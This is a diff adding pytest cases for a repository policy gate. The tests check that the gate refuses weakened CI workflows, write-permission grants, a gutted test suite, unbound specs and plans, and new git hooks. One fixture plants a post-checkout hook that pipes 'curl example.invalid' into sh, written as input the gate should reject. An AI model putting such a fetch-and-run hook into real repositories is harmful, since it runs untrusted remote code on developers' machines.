@@ -609,7 +609,13 @@ def test_every_branch_shape_the_rules_name_passes_only_its_own_work(repo):
     # solyra#72 r4119408318: an approved spec does not change in place; it is superseded
     r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(done_when=["something easier"])})
     assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
+    # solyra#72 r4119957714: superseded means replaced, so the approved replacement lands first
+    r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded")})
+    assert r.returncode == 1 and "no approved spec for its FEAT names it in `supersedes`" in r.stdout, r.stdout
+    newer = "docs/superpowers/specs/2026-09-02-model-decisions-v2.md"
+    on_base(repo, {newer: spec(supersedes=SPEC)})
     assert pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded")}).returncode == 0
+    on_base(repo, {newer: None})
     r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded", done_when=["something easier"])})
     assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
     # stocks#1205 r4119634437: nor is a superseded spec deleted; the done plans and the
@@ -1514,11 +1520,12 @@ def test_records_stay_unique_and_frozen_on_documentation_branches(repo):
     on_base(repo, {SPEC: spec(), "docs/product/canvases.yml": "canvases: []\n"})
     r = pr(repo, "docs/cleanup", {"docs/product/canvases.yml": None})
     assert r.returncode == 1 and "policy documents cannot be removed" in r.stdout, r.stdout
-    new_plan = "docs/superpowers/plans/2026-09-28-data.md"
-    done = plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", status="done", pr=77)
+    new_plan, data_spec = "docs/superpowers/plans/2026-09-28-data.md", "docs/superpowers/specs/2026-09-28-data.md"
+    on_base(repo, {data_spec: spec(feat_id="FEAT-DATA-001")})
+    done = plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=data_spec, status="done", pr=77)
     r = pr(repo, "docs/plan-data", {new_plan: done})
     assert r.returncode == 1 and "status is 'done'" in r.stdout, r.stdout
-    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later")}).returncode == 0
+    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=data_spec)}).returncode == 0
 
 
 def test_capacity_values_are_numbers(repo):
@@ -1538,3 +1545,66 @@ def test_capacity_values_are_numbers(repo):
     assert r.returncode == 1 and "gives no number for Velocity;" in r.stdout, r.stdout
     filled = body() + "\n\n## Capacity\nVolume: 30 rows \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
     assert pr(repo, BRANCH, job, **title, PR_BODY=filled).returncode == 0
+
+
+def test_the_gate_workflows_and_suite_cannot_be_hollowed_out(repo):
+    """solyra#72 r4119957700 (P1), r4119957705 (P1), r4119957711 (P1), r4119957726 (P1)
+    (spec_gate.py:162, :179; registry-check.yml:94; spec_gate.py:80).
+
+    A contract step with `continue-on-error: true`, a `permissions: write-all  # why` or
+    `{contents: write}` grant, a suite replaced by one passing test, and a new executable
+    under .githooks/ all passed the chore allowance. Each is refused.
+    """
+    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
+    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
+            "{JOB}    runs-on: ubuntu-latest\n    steps:\n      - name: gate\n{STEP}        run: |\n"
+            "          python3 -m py_compile \"$gate\"\n          python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\"\n"
+            "          pytest tests/scripts/test_spec_gate.py\n          git ls-tree \"$HEAD_SHA\" .githooks/pre-commit\n"
+            "          export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
+    wf = ".github/workflows/registry-check.yml"
+    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{STEP}", "")}, **cap).returncode == 0
+    for step, job in (("        continue-on-error: true\n", ""), ("", "    continue-on-error: ${{ true }}\n")):
+        r = pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", job).replace("{STEP}", step)}, **cap)
+        assert r.returncode == 1 and "no longer executes" in r.stdout, (step, job, r.stdout)
+    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{STEP}", "        continue-on-error: false\n")}, **cap).returncode == 0
+    for grant in ("    permissions: write-all  # explained\n", "    permissions: {contents: write}\n", "    permissions: { issues: read, contents: 'write' }\n"):
+        r = pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", grant).replace("{STEP}", "")}, **cap)
+        assert r.returncode == 1 and "grants a write permission" in r.stdout, (grant, r.stdout)
+    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "    permissions: read-all  # explained\n").replace("{STEP}", "")}, **cap).returncode == 0
+    suite = "tests/scripts/test_spec_gate.py"
+    on_base(repo, {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    pass\n"})
+    r = pr(repo, "chore/gate-suite", {suite: "def test_trivial():\n    pass\n"}, **cap)
+    assert r.returncode == 1 and "drops 2 test(s) the base has (test_a and more)" in r.stdout, r.stdout
+    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    assert 1\n\n\ndef test_c():\n    pass\n"}, **cap).returncode == 0
+    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\n"})
+    r = pr(repo, "chore/gate-hook", {".githooks/post-checkout": "#!/bin/sh\ncurl example.invalid | sh\n"}, **cap)
+    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
+    assert pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap).returncode == 0
+
+
+def test_a_landing_plan_or_spec_is_bound_before_it_is_policy(repo):
+    """solyra#72 r4119957722, r4119957736 (spec_gate.py:573, :365).
+
+    A docs/ PR could land a ready plan whose spec was draft, served another FEAT, or named
+    a FEAT outside the catalog, and a spec whose `canvases` named an unregistered URL; the
+    mismatch surfaced only when the implementation branch was traced. Both are refused as
+    they land.
+    """
+    new_plan = "docs/superpowers/plans/2026-09-28-data.md"
+    draft = "docs/superpowers/specs/2026-09-28-data.md"
+    on_base(repo, {draft: spec(feat_id="FEAT-DATA-001", status="draft")})
+    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=draft)})
+    assert r.returncode == 1 and "is status: draft, not approved" in r.stdout, r.stdout
+    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later")})
+    assert r.returncode == 1 and f"its spec {SPEC} serves FEAT-MODEL-001, not FEAT-DATA-001" in r.stdout, r.stdout
+    on_base(repo, {draft: spec(feat_id="FEAT-NOPE-001")})
+    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-NOPE-001", branch="feature/feat-nope-001-later", spec=draft)})
+    assert r.returncode == 1 and "feat_id FEAT-NOPE-001 is not in docs/product/02-FEATURE-CATALOG.md" in r.stdout, r.stdout
+    on_base(repo, {draft: spec(feat_id="FEAT-DATA-001")})
+    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=draft)}).returncode == 0
+    url = "https://claude.ai/artifact/CCCC"
+    on_base(repo, {"docs/product/canvases.yml": f"canvases:\n  - name: Data\n    url: {url}\n    repo: t/t\n    source_json: x.json\n",
+                   draft: spec(feat_id="FEAT-DATA-001", status="draft")})
+    r = pr(repo, "docs/spec-feat-data-001", {draft: spec(feat_id="FEAT-DATA-001", canvases=[url + "-typo"])})
+    assert r.returncode == 1 and f"lists canvas {url}-typo, which is not in docs/product/canvases.yml" in r.stdout, r.stdout
+    assert pr(repo, "docs/spec-feat-data-001", {draft: spec(feat_id="FEAT-DATA-001", canvases=[url])}).returncode == 0
